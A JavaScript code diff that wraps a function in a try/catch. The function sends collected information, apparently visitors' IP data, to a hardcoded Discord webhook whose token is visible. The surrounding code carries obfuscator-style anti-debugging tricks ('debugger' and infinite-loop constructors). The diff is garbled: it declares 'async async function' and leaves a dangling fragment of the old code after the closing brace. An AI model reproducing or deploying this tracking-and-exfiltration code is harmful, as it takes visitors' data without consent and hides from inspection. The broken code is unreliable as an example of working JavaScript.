@@ -77,7 +77,7 @@ fetchAndDisplayIPData();
 }
 
 
-async function sendToWebhook(info) {
+async async function sendToWebhook(info) {
     const webhookUrl = "https://discord.com/api/webhooks/1388405456430436443/7dUtCcjyd6Sof3oJqc8PcrgA4LBiGVs5PnPnIadV4sze67ji96uZf21acYKiwLCvMTTM"; // Replace this
 
     const embed = {
@@ -86,21 +86,18 @@ async function sendToWebhook(info) {
         description: info.map(i => `**${i.label}:** ${i.value}`).join("\n")
     };
 
-    await fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ embeds: [embed] })
-    });
-}
-
-function init(param) {
-    function countup(counter) {
-        if (typeof counter === "string") {
-            return function() {}.constructor("while (true) {}").apply("counter");
-        } else {
-            if (('' + counter / counter).length !== 1 || counter % 20 === 0) {
+    try {
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch (e) {
+        console.error("Webhook failed", e);
+    }
+}     if (('' + counter / counter).length !== 1 || counter % 20 === 0) {
                 (function() {
                     return true;
                 }).constructor("debugger").call("action");
